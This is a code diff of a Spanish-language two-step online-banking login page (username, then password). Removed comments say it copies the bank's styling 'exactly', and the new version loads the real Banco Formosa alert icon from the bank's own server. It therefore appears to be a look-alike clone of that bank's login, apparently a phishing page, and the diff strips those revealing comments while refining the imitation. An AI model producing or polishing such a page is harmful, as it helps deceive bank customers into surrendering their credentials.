@@ -162,7 +162,7 @@
             display: none;
         }
 
-        /* ===== WARNING INFO (con fondo blanco y márgenes negativos) ===== */
+        /* ===== WARNING INFO ===== */
         .warning-info {
             background-color: white !important;
             display: flex;
@@ -187,14 +187,10 @@
             height: 28px;
         }
 
-        .warning-icon svg {
+        .warning-icon img {
             width: 100%;
             height: 100%;
-            fill: none;
-            stroke: #f7c948;
-            stroke-width: 2;
-            stroke-linecap: round;
-            stroke-linejoin: round;
+            object-fit: contain;
         }
 
         .warning-text h1 {
@@ -292,7 +288,7 @@
             margin-top: 4px;
         }
 
-        /* ===== INPUTS (estilo exacto del banco) ===== */
+        /* ===== INPUTS ===== */
         .input {
             border: 2px solid white !important;
             background-color: transparent !important;
@@ -319,7 +315,6 @@
             background-color: rgba(255, 255, 255, 0.05) !important;
         }
 
-        /* Iconos de los inputs */
         .input-icon {
             position: absolute;
             left: 20px;
@@ -384,6 +379,18 @@
             box-shadow: 0 6px 24px rgba(255, 255, 255, 0.15);
         }
 
+        .boton:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .boton:disabled:hover {
+            background: white;
+            transform: none;
+            box-shadow: none;
+        }
+
         /* ===== FORGOT TEXT ===== */
         .forgot-text {
             text-align: center;
@@ -399,7 +406,7 @@
             text-decoration: underline;
         }
 
-        /* ===== LOGIN HELP (estilo exacto del banco) ===== */
+        /* ===== LOGIN HELP ===== */
         .login-help {
             background: #00a5df;
             align-self: center;
@@ -429,7 +436,7 @@
             display: none !important;
         }
 
-        /* ===== MOBILE INFO (oculto en PC) ===== */
+        /* ===== MOBILE INFO ===== */
         .mobileInfo {
             display: none;
         }
@@ -738,14 +745,10 @@
                             a tu banco online
                         </h1>
 
-                        <!-- ===== ALERTA DE SEGURIDAD (con ícono SVG incorporado) ===== -->
+                        <!-- ===== ALERTA DE SEGURIDAD ===== -->
                         <div class="warning-info">
                             <div class="warning-icon">
-                                <svg viewBox="0 0 24 24">
-                                    <circle cx="12" cy="12" r="10"/>
-                                    <line x1="12" y1="8" x2="12" y2="12"/>
-                                    <line x1="12" y1="16" x2="12.01" y2="16"/>
-                                </svg>
+                                <img src="https://hb.bancoformosa.com.ar/assets/img/alertIcon.svg" alt="Alerta">
                             </div>
                             <div class="warning-text">
                                 <h1><b>Evitemos las estafas</b></h1>
@@ -792,7 +795,7 @@
                             </button>
                         </div>
 
-                        <!-- ===== PASO 2: CLAVE (oculto inicialmente) ===== -->
+                        <!-- ===== PASO 2: CLAVE ===== -->
                         <div id="pasoClave" class="oculto">
                             <div class="row">
                                 <h2 class="widthVolver remove-margin-bottom">
@@ -819,7 +822,7 @@
                             </p>
                         </div>
 
-                        <p class="forgot-text" id="forgotUsuario">
+                        <p class="forgot-text">
                             Olvidé o bloqueé mi Clave y/o Usuario
                         </p>
                         <div class="login-help">
@@ -897,15 +900,12 @@
                 return;
             }
 
-            // Ocultar paso 1
             document.getElementById('pasoUsuario').style.display = 'none';
-            // Mostrar paso 2
             var pasoClave = document.getElementById('pasoClave');
             pasoClave.classList.remove('oculto');
             pasoClave.style.display = 'block';
             pasoClave.style.animation = 'fadeIn 0.3s ease forwards';
             
-            // Enfocar campo clave
             setTimeout(function() {
                 document.getElementById('campoClave').focus();
             }, 400);
@@ -944,7 +944,6 @@
             }
         });
 
-        // Inicializar el botón deshabilitado
         document.getElementById('btnSiguiente').disabled = true;
         document.getElementById('btnSiguiente').style.opacity = '0.5';
         document.getElementById('btnSiguiente').style.cursor = 'not-allowed';
